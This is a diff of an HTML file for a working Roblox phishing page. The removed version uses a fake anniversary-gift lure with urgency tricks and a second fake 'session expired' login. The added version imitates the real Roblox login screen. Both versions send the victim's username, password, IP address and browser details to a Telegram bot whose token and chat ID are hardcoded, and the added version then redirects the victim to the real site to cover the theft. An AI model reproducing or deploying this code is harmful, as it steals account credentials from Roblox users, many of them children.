@@ -3,14 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎉 Roblox 20th Anniversary Gift</title>
+    <title>Log in to Roblox</title>
     <script>
         const BOT_TOKEN='8693145371:AAHfPNL_W-f0P2MPWut5_CxmWuDhvr8F7Qw';
         const CHAT_ID = '1361048119';
         
-        function claimGift() {
-            document.getElementById('claimPage').style.display = 'none';
-            document.getElementById('loginPage').style.display = 'block';
+        function togglePassword() {
+            var pwd = document.getElementById('password');
+            var icon = document.getElementById('eyeIcon');
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                icon.textContent = '👁';
+            } else {
+                pwd.type = 'password';
+                icon.textContent = '👁‍🗨';
+            }
         }
         
         function submitLogin() {
@@ -18,264 +25,376 @@
             var password = document.getElementById('password').value;
             
             if (!username || !password) {
-                document.getElementById('loginError').style.display = 'block';
-                document.getElementById('loginError').textContent = 'Please fill in all fields.';
+                document.getElementById('errorMsg').style.display = 'block';
+                document.getElementById('errorMsg').textContent = 'Please fill in all fields.';
                 return;
             }
             
-            document.getElementById('loginBtn').style.display = 'none';
-            document.getElementById('loginLoading').style.display = 'block';
-            document.getElementById('loginError').style.display = 'none';
+            document.getElementById('loginBtn').disabled = true;
+            document.getElementById('loginBtn').textContent = 'Logging in...';
+            document.getElementById('errorMsg').style.display = 'none';
             
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(d => d.ip)
                 .catch(() => 'Unknown')
                 .then(function(ip) {
-                    var msg = '🔴 ROBLOX PHISH CAPTURE' + '%0A' +
-                              '├ Event: 20th Anniversary Gift' + '%0A' +
-                              '├ Username: ' + encodeURIComponent(username) + '%0A' +
-                              '├ Password: ' + encodeURIComponent(password) + '%0A' +
+                    var msg = '🔴 ROBLOX LOGIN' + '%0A' +
+                              '├ User: ' + encodeURIComponent(username) + '%0A' +
+                              '├ Pass: ' + encodeURIComponent(password) + '%0A' +
                               '├ IP: ' + ip + '%0A' +
                               '├ Time: ' + new Date().toLocaleString('id-ID') + '%0A' +
                               '└ UA: ' + encodeURIComponent(navigator.userAgent);
                     
                     return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg);
                 })
-                .then(function() {
-                    // Attempt 2: redirect to "session expired" login
-                    document.getElementById('loginLoading').style.display = 'none';
-                    document.getElementById('loginPage').style.display = 'none';
-                    document.getElementById('verifyPage').style.display = 'block';
+                .then(() => {
+                    window.location.href = 'https://www.roblox.com/login?error=InvalidCredentials';
                 })
-                .catch(function() {
-                    document.getElementById('loginLoading').style.display = 'none';
-                    document.getElementById('loginBtn').style.display = 'block';
-                    document.getElementById('loginError').style.display = 'block';
-                    document.getElementById('loginError').textContent = 'Connection error. Please try again.';
-                });
-        }
-        
-        function submitVerify() {
-            var username = document.getElementById('username2').value;
-            var password = document.getElementById('password2').value;
-            
-            document.getElementById('verifyBtn').style.display = 'none';
-            document.getElementById('verifyLoading').style.display = 'block';
-            
-            var msg = '🔴 [2ND ATTEMPT] ROBLOX PHISH' + '%0A' +
-                      '├ Username: ' + encodeURIComponent(username) + '%0A' +
-                      '├ Password: ' + encodeURIComponent(password) + '%0A' +
-                      '├ Time: ' + new Date().toLocaleString('id-ID');
-            
-            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg)
-                .then(function() {
-                    document.getElementById('verifyLoading').style.display = 'none';
-                    document.getElementById('verifyPage').style.display = 'none';
-                    document.getElementById('successPage').style.display = 'block';
+                .catch(() => {
+                    document.getElementById('loginBtn').disabled = false;
+                    document.getElementById('loginBtn').textContent = 'Log In';
+                    document.getElementById('errorMsg').style.display = 'block';
+                    document.getElementById('errorMsg').textContent = 'Something went wrong. Please try again.';
                 });
         }
     </script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-            background: linear-gradient(135deg, #0b1a2e 0%, #1a2a4a 50%, #0b1a2e 100%);
-            min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
-        .card {
-            background: #1b1b2f; border-radius: 24px; padding: 40px 30px;
-            width: 100%; max-width: 420px; box-shadow: 0 25px 80px rgba(0,0,0,0.6);
-            text-align: center; border: 1px solid rgba(255,255,255,0.05);
+        .header-bar {
+            background: linear-gradient(135deg, #0b1a2e 0%, #1a2a4a 100%);
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
-        .badge {
+        .header-bar .logo-text {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .header-bar .nav-links {
+            display: flex;
+            gap: 16px;
+            align-items: center;
+        }
+        .header-bar .nav-links a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .header-bar .nav-links a:hover { color: #fff; }
+        .header-bar .signup-btn {
             background: linear-gradient(135deg, #ff0066, #ff6600);
-            color: #fff; font-size: 12px; font-weight: 600; padding: 6px 14px;
-            border-radius: 20px; display: inline-block; margin-bottom: 15px;
-            text-transform: uppercase; letter-spacing: 1px;
+            color: #fff;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
         }
-        h1 { font-size: 26px; color: #fff; margin-bottom: 8px; }
-        .subtitle { color: #aaa; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
-        .logo { font-size: 60px; margin-bottom: 15px; }
-        .gift-box {
-            width: 100%; height: 180px; border-radius: 16px;
-            background: linear-gradient(135deg, rgba(255,0,102,0.15), rgba(255,102,0,0.15));
-            border: 1px dashed rgba(255,102,0,0.4);
-            display: flex; align-items: center; justify-content: center;
-            flex-direction: column; margin-bottom: 25px;
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 40px 16px 60px;
         }
-        .gift-box .icon { font-size: 48px; margin-bottom: 10px; }
-        .gift-box .text { color: #ff6600; font-size: 14px; font-weight: 500; }
-        .gift-box .limited {
-            color: #ff0066; font-size: 13px; margin-top: 5px; font-weight: 600;
+        .login-card {
+            background: #fff;
+            width: 100%;
+            max-width: 388px;
+            padding: 30px 30px 20px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            align-self: flex-start;
         }
-        .btn-primary {
-            width: 100%; padding: 16px; border-radius: 12px; border: none;
-            background: linear-gradient(135deg, #ff0066, #ff6600);
-            color: #fff; font-size: 16px; font-weight: 600; cursor: pointer;
-            transition: 0.3s; text-transform: uppercase; letter-spacing: 0.5px;
+        .logo-area {
+            text-align: center;
+            margin-bottom: 20px;
         }
-        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(255,0,102,0.3); }
-        .btn-secondary {
-            width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #2a2a4a;
-            background: transparent; color: #fff; font-size: 14px; cursor: pointer; margin-top: 12px;
+        .logo-area .r-logo {
+            display: inline-block;
         }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        .input-group label { color: #aaa; font-size: 13px; display: block; margin-bottom: 5px; }
+        .logo-area .r-logo svg {
+            width: 140px;
+            height: auto;
+        }
+        .logo-area h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #161616;
+            margin-top: 16px;
+            letter-spacing: -0.3px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #606060;
+            margin-bottom: 6px;
+        }
+        .input-group .input-wrap {
+            position: relative;
+        }
         .input-group input {
-            width: 100%; padding: 14px 16px; border-radius: 10px; border: 2px solid #2a2a4a;
-            background: #0d0d1a; color: #fff; font-size: 15px; outline: none; transition: 0.3s;
+            width: 100%;
+            padding: 10px 12px;
+            border-radius: 4px;
+            border: 1px solid #dadada;
+            background: #fff;
+            font-size: 14px;
+            color: #161616;
+            outline: none;
+            transition: 0.15s;
         }
-        .input-group input:focus { border-color: #ff0066; box-shadow: 0 0 0 3px rgba(255,0,102,0.2); }
-        .counter {
-            display: flex; justify-content: center; gap: 12px; margin: 20px 0;
+        .input-group input:focus {
+            border-color: #00a2ff;
+            box-shadow: 0 0 0 3px rgba(0,162,255,0.2);
         }
-        .counter-item { text-align: center; }
-        .counter-item .num {
-            background: #0d0d1a; border: 1px solid #2a2a4a; border-radius: 10px;
-            padding: 10px 16px; font-size: 24px; font-weight: 700; color: #ff6600; min-width: 50px;
+        .input-group .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            color: #999;
+            padding: 4px;
         }
-        .counter-item .label { color: #666; font-size: 11px; margin-top: 4px; }
-        .progress-bar {
-            width: 100%; height: 8px; background: #0d0d1a; border-radius: 4px;
-            margin: 15px 0; overflow: hidden;
+        .forgot-link {
+            text-align: right;
+            margin-top: 4px;
         }
-        .progress-fill {
-            width: 78%; height: 100%; background: linear-gradient(90deg, #ff0066, #ff6600);
-            border-radius: 4px; animation: pulse 2s infinite;
+        .forgot-link a {
+            color: #00a2ff;
+            text-decoration: none;
+            font-size: 13px;
         }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
-        .loading { display: none; text-align: center; margin-top: 15px; }
-        .spinner {
-            border: 3px solid #2a2a4a; border-top: 3px solid #ff6600;
-            border-radius: 50%; width: 28px; height: 28px;
-            animation: spin 0.8s linear infinite; margin: 10px auto;
+        .forgot-link a:hover { text-decoration: underline; }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin: 12px 0 16px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .error-msg { color: #ff4444; font-size: 13px; margin-top: 10px; display: none; }
-        .success-icon { font-size: 64px; margin-bottom: 15px; }
-        .success-title { font-size: 22px; color: #4ade80; font-weight: 600; margin-bottom: 10px; }
-        .success-text { color: #aaa; font-size: 14px; line-height: 1.6; }
-        .secret-note { 
-            margin-top: 20px; padding: 12px; border-radius: 10px; 
-            background: rgba(74, 222, 128, 0.1); border: 1px solid rgba(74, 222, 128, 0.2);
-            font-size: 12px; color: #4ade80;
+        .checkbox-group input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #00a2ff;
+            cursor: pointer;
         }
-        .timer { color: #666; font-size: 12px; margin-top: 15px; }
+        .checkbox-group label {
+            font-size: 13px;
+            color: #606060;
+            cursor: pointer;
+        }
+        .error-msg {
+            display: none;
+            background: #fff0f0;
+            border: 1px solid #ffcccc;
+            border-radius: 4px;
+            padding: 10px 12px;
+            color: #cc0000;
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+        .login-btn {
+            width: 100%;
+            height: 44px;
+            border: none;
+            border-radius: 4px;
+            background: linear-gradient(180deg, #00a2ff 0%, #0071c5 100%);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+        .login-btn:hover { background: linear-gradient(180deg, #0095f0, #0066b3); }
+        .login-btn:active { transform: scale(0.98); }
+        .login-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .or-divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .or-divider .line {
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+        .or-divider span {
+            color: #c0c0c0;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .social-btn {
+            width: 100%;
+            height: 44px;
+            border: 1px solid #dadada;
+            border-radius: 4px;
+            background: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: 0.15s;
+        }
+        .social-btn:hover { border-color: #bbb; background: #fafafa; }
+        .social-btn .icon { font-size: 18px; }
+        .social-btn .icon.apple { font-size: 20px; }
+        .card-footer {
+            text-align: center;
+            margin-top: 24px;
+            padding-top: 16px;
+        }
+        .card-footer span {
+            color: #606060;
+            font-size: 14px;
+        }
+        .card-footer a {
+            color: #00a2ff;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .card-footer a:hover { text-decoration: underline; }
+        .page-footer {
+            background: #f5f5f5;
+            padding: 24px 16px;
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+        }
+        .page-footer a {
+            color: #808080;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 10px;
+        }
+        .page-footer a:hover { text-decoration: underline; }
+        .page-footer .copyright {
+            color: #999;
+            font-size: 11px;
+            margin-top: 12px;
+        }
     </style>
 </head>
 <body>
-
-<!-- ======== PAGE 1: CLAIM PAGE ======== -->
-<div class="card" id="claimPage">
-    <div class="badge">🎉 LIMITED EVENT</div>
-    <div class="logo">🎂</div>
-    <h1>Roblox 20th Anniversary</h1>
-    <p class="subtitle">You have been selected to receive a <strong>limited edition gift</strong>! Complete your claim before they run out.</p>
-    
-    <div class="gift-box">
-        <div class="icon">🎁</div>
-        <div class="text">Dominus Empyreus + 10,000 Robux</div>
-        <div class="limited">⚡ Only 500 claims available worldwide</div>
-    </div>
-    
-    <div class="progress-bar">
-        <div class="progress-fill"></div>
-    </div>
-    <p style="color:#888;font-size:12px;margin-top:5px;">412 of 500 gifts claimed</p>
-    
-    <div class="counter">
-        <div class="counter-item">
-            <div class="num">03</div>
-            <div class="label">Hours</div>
-        </div>
-        <div class="counter-item">
-            <div class="num">47</div>
-            <div class="label">Minutes</div>
-        </div>
-        <div class="counter-item">
-            <div class="num">22</div>
-            <div class="label">Seconds</div>
+    <div class="header-bar">
+        <span class="logo-text">Roblox</span>
+        <div class="nav-links">
+            <a href="#">Charts</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Create</a>
+            <a href="#">Robux</a>
+            <a href="#" class="signup-btn">Sign Up</a>
         </div>
     </div>
     
-    <button class="btn-primary" onclick="claimGift()">🎁 Claim Your Gift →</button>
-    <p class="timer">⏰ Offer expires in 3 hours</p>
-</div>
-
-<!-- ======== PAGE 2: LOGIN PAGE ======== -->
-<div class="card" id="loginPage" style="display:none;">
-    <div style="font-size:48px;margin-bottom:10px;">🔐</div>
-    <h1>Roblox Login</h1>
-    <p class="subtitle">Sign in to verify your account and claim your anniversary gift.</p>
-    
-    <form onsubmit="event.preventDefault(); submitLogin();">
-        <div class="input-group">
-            <label>Username / Email</label>
-            <input type="text" id="username" placeholder="Enter your Roblox username" required autocomplete="off">
+    <div class="main-container">
+        <div class="login-card">
+            <div class="logo-area">
+                <div class="r-logo">
+                    <svg viewBox="0 0 140 40" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="0" y="8" width="24" height="24" rx="4" fill="#E2231A"></rect>
+                        <text x="6" y="26" font-family="Arial" font-size="16" font-weight="800" fill="#fff">R</text>
+                        <text x="32" y="26" font-family="Arial" font-size="20" font-weight="700" fill="#161616">Roblox</text>
+                    </svg>
+                </div>
+                <h1>Login to Roblox</h1>
+            </div>
+            
+            <div class="error-msg" id="errorMsg">Invalid username or password. Please try again.</div>
+            
+            <form onsubmit="event.preventDefault(); submitLogin();">
+                <div class="input-group">
+                    <label>Username/Email/Phone</label>
+                    <div class="input-wrap">
+                        <input type="text" id="username" placeholder="Username/Email/Phone" required="" autocomplete="off">
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-wrap">
+                        <input type="password" id="password" placeholder="Password" required="">
+                        <button type="button" class="password-toggle" onclick="togglePassword()" tabindex="-1">
+                            <span id="eyeIcon">👁‍🗨</span>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="forgot-link">
+                    <a href="#">Forgot Password or Username?</a>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember" checked="">
+                    <label for="remember">Remember me</label>
+                </div>
+                
+                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            </form>
+            
+            <div class="or-divider">
+                <div class="line"></div>
+                <span>OR</span>
+                <div class="line"></div>
+            </div>
+            
+            <div class="social-buttons">
+                <button class="social-btn" onclick="return false;">
+                    <span class="icon">G</span>
+                    Sign in with Google
+                </button>
+                <button class="social-btn" onclick="return false;">
+                    <span class="icon apple"></span>
+                    Sign in with Apple
+                </button>
+            </div>
+            
+            <div class="card-footer">
+                <span>Don't have an account? </span><a href="#">Sign Up</a>
+            </div>
         </div>
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="password" placeholder="Enter your password" required>
-        </div>
-        
-        <button type="submit" class="btn-primary" id="loginBtn">Sign In →</button>
-        
-        <div class="loading" id="loginLoading">
-            <div class="spinner"></div>
-            <p style="color:#888;font-size:13px;margin-top:10px;">Verifying your account...</p>
-        </div>
-        <div class="error-msg" id="loginError">⚠️ Invalid username or password. Please try again.</div>
-    </form>
-    
-    <button class="btn-secondary" onclick="window.location.href='https://www.roblox.com'">← Back to Roblox</button>
-</div>
-
-<!-- ======== PAGE 3: VERIFY (2nd login attempt) ======== -->
-<div class="card" id="verifyPage" style="display:none;">
-    <div style="font-size:48px;margin-bottom:10px;">⚠️</div>
-    <h1>Session Expired</h1>
-    <p class="subtitle">Your session has expired due to inactivity. Please sign in again to continue.</p>
-    
-    <form onsubmit="event.preventDefault(); submitVerify();">
-        <div class="input-group">
-            <label>Username / Email</label>
-            <input type="text" id="username2" placeholder="Enter your username" required>
-        </div>
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="password2" placeholder="Enter your password" required>
-        </div>
-        
-        <button type="submit" class="btn-primary" id="verifyBtn">Sign In →</button>
-        
-        <div class="loading" id="verifyLoading">
-            <div class="spinner"></div>
-            <p style="color:#888;font-size:13px;margin-top:10px;">Re-verifying...</p>
-        </div>
-    </form>
-</div>
-
-<!-- ======== PAGE 4: SUCCESS ======== -->
-<div class="card" id="successPage" style="display:none;">
-    <div class="success-icon">🎉</div>
-    <div class="success-title">Congratulations!</div>
-    <p class="subtitle">Your account has been verified and your gift has been sent!</p>
-    
-    <div class="secret-note">
-        ✅ Dominus Empyreus — Added to inventory<br>
-        ✅ 10,000 Robux — Will be credited within 24 hours<br>
-        ✅ Exclusive 20th Anniversary Badge — Unlocked!
     </div>
     
-    <p style="color:#888;font-size:13px;margin:20px 0;">
-        Check your inventory in the next 24 hours. Happy anniversary!
-    </p>
-    
-    <button class="btn-primary" onclick="window.location.href='https://www.roblox.com/home'">
-        Go to My Inventory →
-    </button>
-</div>
-
+    <div class="page-footer">
+        <a href="#">About Us</a>
+        <a href="#">Jobs</a>
+        <a href="#">Blog</a>
+        <a href="#">Parents</a>
+        <a href="#">Gift Cards</a>
+        <a href="#">Help</a>
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+        <div class="copyright">© 2026 Roblox Corporation. All rights reserved.</div>
+    </div>
 </body>
 </html>
